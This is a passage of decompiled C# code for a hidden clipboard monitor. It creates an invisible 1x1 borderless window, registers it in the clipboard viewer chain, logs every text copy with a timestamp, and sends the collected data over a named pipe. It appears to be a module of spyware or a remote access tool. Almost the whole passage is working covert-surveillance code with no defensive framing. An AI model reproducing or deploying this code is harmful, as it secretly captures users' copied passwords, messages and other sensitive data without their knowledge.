							List<byte> list2 = new List<byte>();
							list2.AddRange(BitConverter.GetBytes(list.Count));
							list2.AddRange(list);
							namedPipeServerStream.Write(list2.ToArray(), 0, list2.Count);
						}
					}
					catch
					{
					}
				}
			});
		}

		public void DisplayClipboardData()
		{
			try
			{
				if (!NtApi32.OpenClipboard(IntPtr.Zero))
				{
					return;
				}
				if (NtApi32.IsClipboardFormatAvailable(1u))
				{
					IntPtr clipboardData = NtApi32.GetClipboardData(13u);
					if (clipboardData != IntPtr.Zero)
					{
						string text = Marshal.PtrToStringUni(clipboardData);
						ClipInfo item = new ClipInfo
						{
							time = "[ time ]: " + DateTime.Now,
							type = "[ type ]: text",
							content = "[ content ]: " + text
						};
						ClipInfos.Add(item);
					}
				}
				NtApi32.CloseClipboard();
			}
			catch (Exception)
			{
			}
		}

		protected override void WndProc(ref Message m)
		{
			switch (((Message)(ref m)).get_Msg())
			{
			case 776:
				DisplayClipboardData();
				NtApi32.SendMessage(nextClipboardViewer, ((Message)(ref m)).get_Msg(), ((Message)(ref m)).get_WParam(), ((Message)(ref m)).get_LParam());
				break;
			case 781:
				if (((Message)(ref m)).get_WParam() == nextClipboardViewer)
				{
					nextClipboardViewer = ((Message)(ref m)).get_LParam();
				}
				else
				{
					NtApi32.SendMessage(nextClipboardViewer, ((Message)(ref m)).get_Msg(), ((Message)(ref m)).get_WParam(), ((Message)(ref m)).get_LParam());
				}
				break;
			default:
				((Form)this).WndProc(ref m);
				break;
			}
		}

		private void ClipBoardForm1_Shown(object sender, EventArgs e)
		{
			((Control)this).Hide();
		}

		private void ClipBoardForm1_FormClosing(object sender, FormClosingEventArgs e)
		{
			NtApi32.ChangeClipboardChain(((Control)this).get_Handle(), nextClipboardViewer);
		}

		protected override void Dispose(bool disposing)
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
			((Form)this).Dispose(disposing);
		}

		private void InitializeComponent()
		{
			//IL_0054: Unknown result type (might be due to invalid IL or missing references)
			//IL_005e: Expected O, but got Unknown
			((Control)this).SuspendLayout();
			((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 12f));
			((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
			((Form)this).set_ClientSize(new Size(1, 1));
			((Form)this).set_FormBorderStyle((FormBorderStyle)0);
			((Control)this).set_Name("ClipBoardForm1");
			((Control)this).set_Text("ClipBoardForm1");
			((Form)this).add_FormClosing(new FormClosingEventHandler(ClipBoardForm1_FormClosing));
			((Form)this).add_Load((EventHandler)ClipBoardForm1_Load);
			((Form)this).add_Shown((EventHandler)ClipBoardForm1_Shown);
			((Control)this).ResumeLayout(false);
		}
	}
	public class ClipInfo
	{
		public string time { get; set; }

		public string type { get; set; }

		public string content { get; set; }
	}
	public class ClipBoardManagers
	{
		public static void Run()
		{
			if (Process.GetCurrentProcess().SessionId != 0 && NtApi32.FindWindowA(null, "ClipBoardForm1") == IntPtr.Zero)
			{
				Thread thread = new Thread((ParameterizedThreadStart)delegate
				{
					WindowStation.SetWindowStation();
					Application.Run((Form)(object)new ClipBoardForm1());
				});
				thread.SetApartmentState(ApartmentState.MTA);
				thread.Start();
			}
		}
	}
}
